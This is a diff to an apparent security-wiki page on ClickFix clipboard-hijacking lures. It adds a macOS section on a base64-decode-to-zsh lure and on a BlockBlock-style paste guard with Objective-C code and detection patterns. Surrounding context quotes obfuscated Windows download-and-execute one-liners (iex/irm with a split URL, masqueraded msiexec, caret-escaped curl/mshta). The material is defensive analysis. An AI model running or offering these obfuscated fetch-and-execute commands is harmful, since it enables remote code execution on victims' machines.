@@ -281,6 +281,40 @@ Recent Red Canary telemetry shows that the stable indicator is **not one exact c
 - **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` avoids a static URL in the command line while still performing in-memory download-and-execute.
 - **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` abuses unusual casing and Unicode-like characters in flags to break brittle detections while still resembling `msiexec.exe`.
 - **Caret-escaped LOLBin chains**: `cmd.exe` can hide keywords with `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), start the nested shell minimized, save attacker content with a benign extension such as `.pdf`, and then execute it through `mshta`.<sup>[[7]](#references)</sup>
+
+## macOS paste-time interception
+
+On macOS, a lure may ask the victim to run a command such as `echo "<base64>" | base64 -D | zsh`. The shell decodes and interprets the hidden stage with the logged-in user's privileges. This is not privilege escalation or a Gatekeeper vulnerability: it abuses an already-running terminal instead of asking the OS to launch a quarantined application. See [macOS Gatekeeper / Quarantine / XProtect](../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-gatekeeper.md) for the application-assessment boundary.<sup>[[9]](#references)</sup>
+
+A paste-time guard can insert an approval step at the point most ClickFix lures depend on. BlockBlock's Paste Protection Mode implements the following sequence.<sup>[[9]](#references)[[10]](#references)</sup>
+
+1. Check `AXIsProcessTrusted()`. If needed, call `AXIsProcessTrustedWithOptions()` with `kAXTrustedCheckOptionPrompt` because the global key monitor requires Accessibility permission.
+2. Register `NSEvent`'s `addGlobalMonitorForEventsMatchingMask:handler:` for key-down events. Match the Command modifier plus `charactersIgnoringModifiers.lowercaseString == @"v"`.
+3. Read `NSWorkspace.sharedWorkspace.frontmostApplication` and compare its bundle ID with known terminals such as `com.apple.Terminal`, `com.googlecode.iterm2`, `com.mitchellh.ghostty`, `net.kovidgoyal.kitty`, and `dev.warp.Warp-Stable`.
+4. Send `SIGSTOP` to the terminal before it consumes the clipboard. Read `NSPasteboardTypeString`, show it to the user, and require an explicit decision.
+5. On **Block**, call `NSPasteboard.generalPasteboard.clearContents`. In every path, resume the terminal with `SIGCONT`. An approved terminal PID can be cached until that terminal instance exits to reduce repeated alerts.
+
+The core interception boundary can be reduced to this skeleton. The alert and error-handling code is intentionally omitted.<sup>[[9]](#references)[[10]](#references)</sup>
+
+```objc
+[NSEvent addGlobalMonitorForEventsMatchingMask:NSEventMaskKeyDown handler:^(NSEvent *e) {
+    if (!(e.modifierFlags & NSEventModifierFlagCommand) ||
+        ![[e.charactersIgnoringModifiers lowercaseString] isEqualToString:@"v"]) return;
+    NSRunningApplication *app = NSWorkspace.sharedWorkspace.frontmostApplication;
+    if (![terminalBundleIDs containsObject:app.bundleIdentifier]) return;
+    kill(app.processIdentifier, SIGSTOP);
+    dispatch_async(dispatch_get_main_queue(), ^{
+        NSString *cmd = [NSPasteboard.generalPasteboard stringForType:NSPasteboardTypeString];
+        if (!userApproved(cmd)) [NSPasteboard.generalPasteboard clearContents];
+        kill(app.processIdentifier, SIGCONT);
+    });
+}];
+```
+
+A broad mode can prompt for every terminal paste. A lower-noise mode can allow empty or very short text and flag structural patterns instead: pipes into `sh`/`bash`/`zsh`, `base64 -d` or `--decode`, `curl` followed by an execution operator, `osascript -e`, `do shell script`, or inline `python -c`/`perl -e`. These checks should inspect command structure instead of relying only on the source application because lures also arrive through email and chat.<sup>[[9]](#references)[[10]](#references)</sup>
+
+This control is a heuristic, not an OS-level paste authorization mechanism. Monitoring only `⌘+V` misses **right-click → Paste** and other input paths. Endpoint Security exposes no `AUTH_PASTE` event, while `AUTH_EXEC`/`NOTIFY_EXEC` cannot reconstruct a whole pasted script: shells may process it line by line, built-ins such as `echo` create no child process, and earlier commands may already have run before later process events arrive. Continuous pasteboard polling is possible but has privacy and performance costs, and macOS provides no supported notification for every clipboard update.<sup>[[9]](#references)</sup>
+
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -306,5 +340,7 @@ Recent Red Canary telemetry shows that the stable indicator is **not one exact c
 - [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
 - [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
 - [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
+- [9] [ClickFix: Stopped at ⌘+V — Defending Against Malicious Terminal Pastes](https://objective-see.org/blog/blog_0x85.html)
+- [10] [BlockBlock ClickFix monitor and `shouldAllowPaste:` implementation](https://github.com/objective-see/BlockBlock/blob/3d7d548e7b399bd42f83bddc2c3ef7de510cf28f/Application/Application/AppDelegate.m#L694-L940)
 
 {{#include ../../banners/hacktricks-training.md}}
